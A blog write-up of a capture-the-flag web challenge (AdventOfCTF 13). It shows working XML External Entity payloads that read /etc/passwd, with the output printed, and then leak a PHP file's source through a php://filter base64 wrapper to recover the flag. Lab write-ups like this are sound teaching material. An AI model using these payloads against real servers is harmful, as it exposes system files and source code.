+++
author = "Maik de Kruif"
title = "Challenge 13 - AdventOfCTF"
date = 2020-12-14T18:48:28+01:00
description = "A writeup for challenge 13 of AdventOfCTF."
cover = "img/adventofctf/2020/24e9ce8f146f70b4189f1d2532a75208.png"
tags = [
    "AdventOfCTF",
    "challenge",
    "ctf",
    "hacking",
    "writeup",
    "web",
    "php",
]
categories = [
    "ctf",
    "writeups",
    "hacking",
]
+++

- Points: 1300

## Description

Lucky number 13! It is like the nightmare before Christmas, except this thing has given many developers nightmares since the late '90s. The flag is in flag.php.

URL: <https://13.adventofctf.com>

## Finding the vulnerability

Upon opening the challenge's website, we're greeted with the following text: "No content" "This is the result of your POST". This means we probably have to send a `POST` request to the website.

### Sending a POST request

To create a `POST` request we can use the Repeater functionality in [Burp Suite](https://portswigger.net/burp) or use cURL like so:

```bash
curl -X POST -d 'variable=test' https://13.adventofctf.com
```

When executing this cURL command, we get some output back:

```html
<b>Warning</b>: DOMDocument::loadXML(): Start tag expected, '&lt;' not found in
Entity, line: 1 in <b>/var/www/html/index.php</b> on line <b>40</b><br />
<br />
<b>Warning</b>: simplexml_import_dom(): Invalid Nodetype to import in
<b>/var/www/html/index.php</b> on line <b>41</b><br />
<br />
<b>Fatal error</b>: Uncaught Error: Call to a member function asXML() on null in
/var/www/html/index.php:43 Stack trace: #0 {main} thrown in
<b>/var/www/html/index.php</b> on line <b>43</b><br />
```

We can see that PHP is trying to load XML. If we look for XML vulnerabilities on the internet we find XXE.

### XML External Entity

An XML External Entity (XXE) attack is an attack in which we can leverage XML to leak information about the server. This attack occurs when XML input containing a reference to an external entity is processed by a weakly configured XML parser.

So, let's try to use an XXE attack on this challenge. An easy way to check for a possible XXE vulnerability is the following:

```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]>
<root>&test;</root>
```

This bit of XML tries to load the contents of `/etc/passwd` and then puts it in the XML. Because the challenge website shows us the result of our `POST` request, this is then put in the HTML shown to us.

In this case, it returned the following:

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY test SYSTEM "file:///etc/passwd">
]>
<root>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
</root>
```

This means our XXE attack worked and we can now try to get the flag.

## Getting the flag

Let's try to use the previous attack but with the flag file:

```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///var/www/html/flag.php'>]>
<root>&test;</root>
```

We get a big error:

{{< code language="html" title="Error message" >}}

```html
<br />
<b>Warning</b>: DOMDocument::loadXML(): StartTag: invalid element name in
file:///var/www/html/flag.php, line: 1 in <b>/var/www/html/index.php</b> on line
<b>40</b><br />
<br />
<b>Warning</b>: DOMDocument::loadXML(): Opening and ending tag mismatch: link
line 11 and head in file:///var/www/html/flag.php, line: 19 in
<b>/var/www/html/index.php</b> on line <b>40</b><br />
<br />
<b>Warning</b>: DOMDocument::loadXML(): Opening and ending tag mismatch: img
line 57 and div in file:///var/www/html/flag.php, line: 58 in
<b>/var/www/html/index.php</b> on line <b>40</b><br />
<br />
<b>Warning</b>: DOMDocument::loadXML(): Opening and ending tag mismatch: div
line 21 and body in file:///var/www/html/flag.php, line: 73 in
<b>/var/www/html/index.php</b> on line <b>40</b><br />
<br />
<b>Warning</b>: DOMDocument::loadXML(): Opening and ending tag mismatch: body
line 20 and html in file:///var/www/html/flag.php, line: 74 in
<b>/var/www/html/index.php</b> on line <b>40</b><br />
<br />
<b>Warning</b>: DOMDocument::loadXML(): Premature end of data in tag meta line 8
in file:///var/www/html/flag.php, line: 75 in <b>/var/www/html/index.php</b> on
line <b>40</b><br />
<br />
<b>Warning</b>: DOMDocument::loadXML(): Premature end of data in tag meta line 7
in file:///var/www/html/flag.php, line: 75 in <b>/var/www/html/index.php</b> on
line <b>40</b><br />
<br />
<b>Warning</b>: DOMDocument::loadXML(): Premature end of data in tag meta line 5
in file:///var/www/html/flag.php, line: 75 in <b>/var/www/html/index.php</b> on
line <b>40</b><br />
<br />
<b>Warning</b>: DOMDocument::loadXML(): Premature end of data in tag meta line 4
in file:///var/www/html/flag.php, line: 75 in <b>/var/www/html/index.php</b> on
line <b>40</b><br />
<br />
<b>Warning</b>: DOMDocument::loadXML(): Premature end of data in tag head line 3
in file:///var/www/html/flag.php, line: 75 in <b>/var/www/html/index.php</b> on
line <b>40</b><br />
<br />
<b>Warning</b>: DOMDocument::loadXML(): Premature end of data in tag html line 2
in file:///var/www/html/flag.php, line: 75 in <b>/var/www/html/index.php</b> on
line <b>40</b><br />
<br />
<b>Warning</b>: DOMDocument::loadXML(): chunk is not well balanced in
file:///var/www/html/flag.php, line: 75 in <b>/var/www/html/index.php</b> on
line <b>40</b><br />
<br />
<b>Warning</b>: DOMDocument::loadXML(): Failure to process entity test in
Entity, line: 3 in <b>/var/www/html/index.php</b> on line <b>40</b><br />
<br />
<b>Warning</b>: DOMDocument::loadXML(): Entity 'test' not defined in Entity,
line: 3 in <b>/var/www/html/index.php</b> on line <b>40</b><br />
<br />
<b>Warning</b>: simplexml_import_dom(): Invalid Nodetype to import in
<b>/var/www/html/index.php</b> on line <b>41</b><br />
<br />
<b>Fatal error</b>: Uncaught Error: Call to a member function asXML() on null in
/var/www/html/index.php:43 Stack trace: #0 {main} thrown in
<b>/var/www/html/index.php</b> on line <b>43</b><br />
```

{{< /code >}}

We probably got it because PHP is actually handling the PHP file as a PHP file 😀. This means we have to get it in some other way.

To do this, we can use the same method as we used in [challenge 11]({{< ref "challenge_11.md" >}}). There we used the PHP filter `convert.base64-encode` which converts it's input to base64.

We can use it like so:

```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY test SYSTEM 'php://filter/convert.base64-encode/resource=flag.php'>]>
<root>&test;</root>
```

If we create a `POST` request with this as the input, we get the following result:

```xml
&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE root [
&lt;!ENTITY test SYSTEM &quot;php://filter/convert.base64-encode/resource=flag.php&quot;&gt;
]&gt;
&lt;root&gt;PCFkb2N0eXBlIGh0bWw+CjxodG1sIGNsYXNzPSJuby1qcyIgbGFuZz0iIj4KICAgIDxoZWFkPgogICAgICAgIDxtZXRhIGNoYXJzZXQ9InV0Zi04Ij4KICAgICAgICA8bWV0YSBodHRwLWVxdWl2PSJ4LXVhLWNvbXBhdGlibGUiIGNvbnRlbnQ9ImllPWVkZ2UiPgogICAgICAgIDx0aXRsZT5BZHZlbnQgb2YgQ1RGIDEzPC90aXRsZT4KICAgICAgICA8bWV0YSBuYW1lPSJkZXNjcmlwdGlvbiIgY29udGVudD0iIj4KICAgICAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEiPgoKICAgICAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9Ii9zdHlsZS5jc3MiIHR5cGU9InRleHQvY3NzIiBtZWRpYT0ic2NyZWVuIiAvPgogICAgICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iaHR0cHM6Ly91c2UuZm9udGF3ZXNvbWUuY29tL3JlbGVhc2VzL3Y1LjYuMy9jc3MvYWxsLmNzcyIgaW50ZWdyaXR5PSJzaGEzODQtVUhSdFpMSStwYnh0SENXcDF0NzdCaTFMNFp0aXFycUQ4MEtuNFo4TlRTUnlNQTJGZDMzbjVkUThsV1VFMDBzLyIgY3Jvc3NvcmlnaW49ImFub255bW91cyI+CiAgICAgICAgPHNjcmlwdCBzcmM9Imh0dHBzOi8vYWpheC5nb29nbGVhcGlzLmNvbS9hamF4L2xpYnMvanF1ZXJ5LzMuMi4xL2pxdWVyeS5taW4uanMiPjwvc2NyaXB0PgogICAgICAgIDxzdHlsZT4KICAgICAgICAgLnJvdy1tYXJnaW4tMDUgeyBtYXJnaW4tdG9wOiAwLjVlbTsgfQogICAgICAgICAucm93LW1hcmdpbi0xMCB7IG1hcmdpbi10b3A6IDEuMGVtOyB9CiAgICAgICAgIC5yb3ctbWFyZ2luLTIwIHsgbWFyZ2luLXRvcDogMi4wZW07IH0KICAgICAgICAgLnJvdy1tYXJnaW4tMzAgeyBtYXJnaW4tdG9wOiAzLjBlbTsgfQogICAgICAgIDwvc3R5bGU+CiAgICA8L2hlYWQ+CiAgICA8Ym9keT4KICAgICAgICA8ZGl2IGNsYXNzPSJqdW1ib3Ryb24gYmctdHJhbnNwYXJlbnQgbWItMCByYWRpdXMtMCI+CiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbnRhaW5lciI+CiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJyb3ciPgogICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbC14bC02IG14LWF1dG8iPgogICAgICAgICAgICAgICAgICAgICAgICA8aDEgY2xhc3M9ImRpc3BsYXktMiI+QWR2ZW50IG9mIENURiA8c3BhbiBjbGFzcz0idmltLWNhcmV0Ij4xMzwvc3Bhbj48L2gxPgogICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJsZWFkIG1iLTMgdGV4dC1tb25vIHRleHQtd2FybmluZyI+WW91ciBkYWlseSBkb3NlIG9mIENURiBmb3IgRGVjZW1iZXI8L2Rpdj4KICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0icm93Ij4KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb2wteGwtNiBteC1hdXRvIj4KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY2FyZCB0ZXh0LWNlbnRlciI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjYXJkLWhlYWRlciI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSXMgdGhpcyB0aGUgZW5kIG9mIHlvdXIgbmlnaHRtYXJlPwogICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjYXJkLWJvZHkiPgoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8cD5IZXJlIGlzIHlvdXIgZmxhZzogPC9wPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDw/cGhwCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGZsYWcgPSAiTk9WSXs8eG1sPm5pZ2h0bWFyZXM8L3htbD59IjsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlY2hvICJXaG9hYWEuLi4gbm90IHRoYXQgZWFzeS4iOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgID8+CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjYXJkLWZvb3RlciI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBpZD0icmVzdWx0Ij4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0icm93IHJvdy1tYXJnaW4tMzAiPgogICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbC14bC02IG14LWF1dG8iPgogICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjYXJkIG1iLTMgdGV4dC1jZW50ZXIgYmctZGFyayB0ZXh0LXdoaXRlIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNhcmQtYm9keSI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0icm93Ij4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29sLW1kLTIiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGltZyBzcmM9Ii9sb2dvLnBuZyI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb2wtbWQtOSBvZmZzZXQtbWQtMSBhbGlnbi1taWRkbGUiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPHAgY2xhc3M9InRleHQtY2VudGVyIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8c3BhbiBjbGFzcz0iYWxpZ24tbWlkZGxlIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVGhlIEFkdmVudCBvZiBDVEYgaXMgYnJvdWdodCB0byB5b3UgYnkgPGEgaHJlZj0iaHR0cDovL3d3dy5ub3ZpLm5sIj5OT1ZJIEhvZ2VzY2hvb2w8L2E+LiBJdCBpcyBidWlsdCBieSA8YSBocmVmPSJodHRwczovL3R3aXR0ZXIuY29tL2NyZWRtcC8iIGNsYXNzPSJpY29Ud2l0dGVyIiB0aXRsZT0iVHdpdHRlciI+PGkgY2xhc3M9ImZhYiBmYS10d2l0dGVyIj48L2k+IEBjcmVkbXA8L2E+LiBJZiB5b3UgYXJlIGxvb2tpbmcgZm9yIGEgRHV0Y2ggQ3liZXIgU2VjdXJpdHkgQmFjaGVsb3IgZGVncmVlIG9yIGJvb3RjYW1wLCA8YSBocmVmPSJodHRwczovL3d3dy5ub3ZpLm5sIj5jaGVjayB1cyBvdXQ8L2E+LgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvc3Bhbj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvcD4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgPC9kaXY+CiAgICA8L2JvZHk+CjwvaHRtbD4K&lt;/root&gt;
```

## Solution

As we can see there is a big base64 encoded string. If we decode this and remove the template HTML from it, we're left with the following:

```html
<p>Here is your flag: </p>
<?php
$flag = "NOVI{<xml>nightmares</xml>}";
echo "Whoaaa... not that easy.";
?>
```

We got the flag! It's `NOVI{<xml>nightmares</xml>}`.

This flag can then be submitted for the [challenge](https://ctfd.adventofctf.com/challenges#13-14).
